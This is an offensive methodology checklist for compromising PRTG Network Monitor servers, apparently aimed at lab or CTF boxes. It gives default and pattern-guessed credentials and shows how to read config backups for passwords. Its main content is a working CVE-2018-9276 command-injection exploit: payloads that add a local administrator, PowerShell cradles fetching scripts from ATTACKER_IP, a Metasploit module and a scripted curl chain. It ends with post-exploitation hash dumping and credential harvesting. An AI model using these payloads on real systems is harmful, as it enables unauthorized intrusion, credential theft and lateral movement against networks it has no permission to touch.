# PRTG Network Monitor Methodology

## 1. Discovery & Enumeration

- [ ] Scan for PRTG web interface
```bash
nmap -sC -sV -p 80,443,8080,8443 TARGET
```
- [ ] Confirm PRTG login page (look for `/index.htm` redirect, PRTG branding, `Server: PRTG/`)
- [ ] Check version number on login page (bottom of page or in page source)
- [ ] Try default credentials:
  - `prtgadmin:prtgadmin`
  - `prtgadmin:Password123`
- [ ] Try pattern-based passwords (PRTG admins love year-based patterns):
  - `prtgadmin:PrTg@dmin2019`
  - `prtgadmin:PrTg@dmin2020`
  - `prtgadmin:PrTg@dmin2021`
  - Swap year based on box release date or config backup timestamps
- [ ] Check for configuration backup files that may leak creds:
```bash
# If you have filesystem access or LFI
cat "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak"
cat "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old"
cat "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat"
```
- [ ] Search backup files for cleartext passwords:
```bash
# Grep for password fields in config backups
grep -i "password\|prtgadmin\|dbpassword" "PRTG Configuration.old.bak"
```

> **Key insight**: passwords in config backups are often one iteration behind the current password. If backup says `PrTg@dmin2018`, try `PrTg@dmin2019` on the login page.

---

## 2. RCE via Notification Command Injection (CVE-2018-9276)

This is the go-to attack path. PRTG lets admins create notifications that execute programs on the server. The parameter field is injectable.

### Prerequisites
- [ ] Valid admin credentials (default or discovered)
- [ ] PRTG version < 18.2.39 (patched in this version, but many boxes are unpatched)

### Step-by-Step

- [ ] Login to PRTG web interface
- [ ] Navigate to: **Setup** (gear icon) → **Account Settings** → **Notifications**
- [ ] Click **"Add new notification"**
- [ ] Give it a name (anything, e.g., `pwned`)
- [ ] Scroll down to **"Execute Program"** section
- [ ] Check the box to enable it
- [ ] Select program: **`Demo exe notification - outfile.ps1`**
- [ ] In the **Parameter** field, inject commands after a semicolon:

**Option A: Add a local admin user (most reliable)**
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

**Option B: PowerShell reverse shell**
```
test.txt;powershell -e BASE64_ENCODED_PAYLOAD
```

Generate the base64 payload:
```bash
# On attacker box
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

**Option C: Download and execute**
```
test.txt;powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
```

- [ ] Click **Save**
- [ ] Back on the notification list, click the **bell icon** (Send test notification) next to your notification
- [ ] Wait ~30 seconds for execution

### Verify and Connect (Option A)

```bash
# Verify new user exists via crackmapexec
crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# Connect with evil-winrm
evil-winrm -i TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# Or connect with psexec (gets SYSTEM)
impacket-psexec prtgadm1:'Pwn3d_by_PRTG!'@TARGET

# Or connect with wmiexec
impacket-wmiexec prtgadm1:'Pwn3d_by_PRTG!'@TARGET
```

---

## 3. Metasploit Module

```bash
msfconsole -q
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS TARGET
set ADMIN_PASSWORD Password123
set LHOST ATTACKER_IP
set LPORT 4444
run
```

> Change `ADMIN_PASSWORD` to whatever credential you discovered.

---

## 4. CVE-2018-9276 via curl (Scriptable, No Browser)

If you want to skip the GUI entirely:

```bash
# Step 1: Authenticate and grab cookies
curl -s -c cookies.txt -L -k "https://TARGET:443/index.htm" \
  -d "username=prtgadmin&password=PrTg%40dmin2019&loginurl=%2Findex.htm"

# Step 2: Create the malicious notification
curl -s -b cookies.txt -k "https://TARGET:443/api/notificationtriggeractions/add" \
  -d "name_=pwned&active_=1&schedule_=-1%7CNone%7C&postpone_=0&comments=&tags=&priority_=0&summode_=2&summarysubject_=&summinutes_=1&accessrights_=1&accessrights_201=0&active_15_=15&active_15_check=15&address0_=test%40test.com&subject0_=&contenttype0_=text%2Fhtml&message0_=&active_17_=17&active_17_check=17&program_=Demo+exe+notification+-+outfile.ps1&parameters_=test.txt%3Bnet+user+prtgadm1+Pwn3d_by_PRTG!+%2Fadd%3Bnet+localgroup+administrators+prtgadm1+%2Fadd&environment_=1&active_18_=18&active_18_check=18&objecttype=notification&id=new"

# Step 3: Get the notification ID (find the newest one)
NOTIF_ID=$(curl -s -b cookies.txt -k "https://TARGET:443/api/table.json?content=notifications&columns=objid,name" | grep -oP '"objid":\K\d+' | tail -1)

# Step 4: Trigger it
curl -s -b cookies.txt -k "https://TARGET:443/api/notificationtest?id=$NOTIF_ID"

echo "[*] Waiting 30s for execution..."
sleep 30

# Step 5: Verify
crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

---

## 5. Post-Exploitation

PRTG runs as **NT AUTHORITY\SYSTEM** by default. Once you are in:

- [ ] Confirm SYSTEM privileges:
```cmd
whoami
# NT AUTHORITY\SYSTEM (if you used psexec)
# or your added admin user (if evil-winrm)
```

- [ ] Harvest credentials from PRTG config files:
```powershell
# Config files with stored creds for monitored devices
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat"
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old"
type "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak"
```

- [ ] Look for stored credentials (SNMP community strings, SSH keys, WMI creds, database passwords):
```powershell
Select-String -Path "C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat" -Pattern "password|community|credential" -AllMatches
```

- [ ] Check for other sensitive PRTG data:
```powershell
# PRTG stores probe data, maps, reports
dir "C:\ProgramData\Paessler\PRTG Network Monitor\" -Recurse
# Log files may reveal network topology
dir "C:\ProgramData\Paessler\PRTG Network Monitor\Logs\"
```

- [ ] If you landed as your added admin (not SYSTEM), escalate:
```bash
# psexec gives SYSTEM directly
impacket-psexec prtgadm1:'Pwn3d_by_PRTG!'@TARGET
```

- [ ] Dump hashes for lateral movement:
```bash
impacket-secretsdump prtgadm1:'Pwn3d_by_PRTG!'@TARGET
```

---

## 6. Decision Tree

```
PRTG Found (port 80/443/8080/8443)
│
├── Can you access the login page?
│   ├── YES
│   │   ├── Try default creds: prtgadmin:prtgadmin, prtgadmin:Password123
│   │   │   ├── SUCCESS → Go to Notification RCE (Section 2)
│   │   │   └── FAIL
│   │   │       ├── Try year patterns: PrTg@dmin20XX
│   │   │       ├── Check if you have filesystem access (LFI, other vuln)
│   │   │       │   ├── YES → Read PRTG Configuration.old.bak → extract password
│   │   │       │   │         → increment year → login → Notification RCE
│   │   │       │   └── NO → Brute force is noisy, try other attack vectors
│   │   │       └── Check for API keys or session tokens in other loot
│   │   │
│   │   └── LOGGED IN
│   │       ├── Manual: Setup → Notifications → Inject command → bell icon
│   │       ├── Scripted: curl-based injection (Section 4)
│   │       └── Metasploit: prtg_authenticated_rce (Section 3)
│   │           │
│   │           └── Shell obtained
│   │               ├── SYSTEM? → Dump hashes, harvest PRTG stored creds
│   │               └── Admin user? → psexec for SYSTEM → then dump
│   │
│   └── NO (filtered/blocked)
│       └── Check for PRTG on alternate ports, try from different network position
```

---

## 7. Quick Reference

| Item | Value |
|------|-------|
| Default port | 80, 443, 8080, 8443 |
| Default creds | prtgadmin:prtgadmin, prtgadmin:Password123 |
| Config path | C:\ProgramData\Paessler\PRTG Network Monitor\ |
| Runs as | NT AUTHORITY\SYSTEM |
| Key CVE | CVE-2018-9276 (notification command injection) |
| Metasploit | exploit/windows/http/prtg_authenticated_rce |
| Notification script | Demo exe notification - outfile.ps1 |
